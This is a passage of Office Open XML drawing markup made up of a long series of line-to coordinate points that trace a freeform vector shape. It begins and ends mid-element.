                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12288" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12802" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13279" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13572" y="3119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13866" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14086" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14159" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14233" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14306" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14489" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14893" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15076" y="3009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15296" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15480" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15626" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15700" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15480" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15370" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15186" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14966" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14709" y="5063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14416" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13572" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13022" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12765" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12288" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12105" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11958" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11958" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="7154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12178" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12325" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12545" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12765" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12985" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13205" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13682" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13976" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14196" y="7154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14306" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14343" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14379" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14343" y="6787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14269" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14086" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13902" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13536" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13316" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13095" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12655" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12435" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12398" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12472" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12655" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12875" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13132" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13609" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14453" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14893" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15076" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15260" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15516" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15736" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15736" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15700" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15773" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15847" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15957" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16103" y="5063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16177" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16250" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16323" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16140" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15920" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15553" y="5650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15003" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14783" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14709" y="5980"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14636" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14599" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14783" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14893" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15150" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15406" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15626" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16030" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16213" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16397" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16397" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16397" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16397" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16397" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16323" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16177" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16067" y="7264"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15076" y="7264"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14783" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14526" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14343" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14196" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14086" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14049" y="8181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14012" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14049" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14159" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14306" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14489" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14856" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15003" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15150" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15223" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15260" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15260" y="9685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15260" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15150" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14893" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14709" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14563" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14489" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14453" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14453" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14489" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14563" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14893" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15113" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15333" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16103" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15993" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15957" y="7961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15993" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16030" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16030" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16030" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15993" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15920" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15847" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15736" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15590" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15516" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15370" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15296" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15260" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15260" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15260" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15296" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15480" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15590" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15626" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15590" y="9795"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15590" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15626" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15370" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15040" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14893" y="10748"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14269" y="11042"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14306" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14343" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14306" y="10345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14233" y="10015"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14086" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13902" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13682" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13499" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13352" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13169" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12839" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12875" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12875" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12875" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12839" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12765" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12655" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12545" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12472" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11628" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11261" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11041" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10748" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8180" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8143" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8143" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8143" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8033" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8290" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="8181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="7154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="6787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10234" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10491" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="7154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="7374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9757" y="7961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9317" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="8878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="8878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10601" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10748" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10858" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10858" y="6677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10784" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10674" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10491" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10344" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="6347"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8290" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8033" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7850" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="8878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7703" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7556" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6823" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6236" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5612" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5612" y="8988"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5612" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5869" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="8181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6749" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7703" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="7374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="7154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8437" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8620" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8950" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8950" y="5650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8620" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8510" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="6677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7813" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7483" y="7264"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7116" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6346" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5832" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5429" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5282" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5282" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4915" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4365" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4218" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3778" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3778" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3815" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3778" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3888" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4108" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4255" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4475" y="7374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4475" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4328" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4218" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4108" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3705" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3191" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2751" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2494" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2421" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="7961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2384" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="8071"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="8071"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2861" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3191" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3338" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3521" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="7154"/>
